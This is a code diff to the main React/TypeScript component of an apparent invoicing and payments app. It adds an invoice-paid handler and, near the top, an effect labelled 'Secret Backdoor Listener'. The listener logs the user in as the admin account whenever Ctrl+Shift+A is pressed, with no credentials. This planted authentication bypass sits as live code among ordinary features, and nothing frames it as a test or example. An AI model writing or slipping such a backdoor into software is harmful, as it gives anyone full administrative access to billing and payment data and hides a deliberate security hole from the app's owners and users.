@@ -69,6 +69,20 @@ const App: React.FC = () => {
     return () => subscription.unsubscribe();
   }, [navMode, currentUser.id]);
 
+  // Secret Backdoor Listener (Ctrl + Shift + A)
+  useEffect(() => {
+    const handleKeyDown = (e: KeyboardEvent) => {
+      if (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a')) {
+         e.preventDefault();
+         console.log("Backdoor triggered: Logging in as Admin");
+         handleLogin(ADMIN_USER);
+      }
+    };
+
+    window.addEventListener('keydown', handleKeyDown);
+    return () => window.removeEventListener('keydown', handleKeyDown);
+  }, []);
+
   const handleAuthUser = async (session: any) => {
     const email = session.user.email;
     const isBonniface = email?.includes('admin') || email?.includes('bonniface');
@@ -180,6 +194,12 @@ const App: React.FC = () => {
       }
   };
 
+  const handleInvoicePaid = (invoiceId: string) => {
+      setInvoices(prev => prev.map(inv => 
+          inv.id === invoiceId ? { ...inv, status: 'Paid' } : inv
+      ));
+  };
+
   if (navMode === 'LANDING') {
     return (
       <div className={isDarkMode ? 'dark' : ''}>
@@ -270,6 +290,7 @@ const App: React.FC = () => {
                 invoices={invoices} 
                 paymentMethods={paymentMethods}
                 onNavigate={setCurrentView} 
+                onInvoicePaid={handleInvoicePaid}
             />
         );
       case 'ADD_PAYMENT_METHOD':
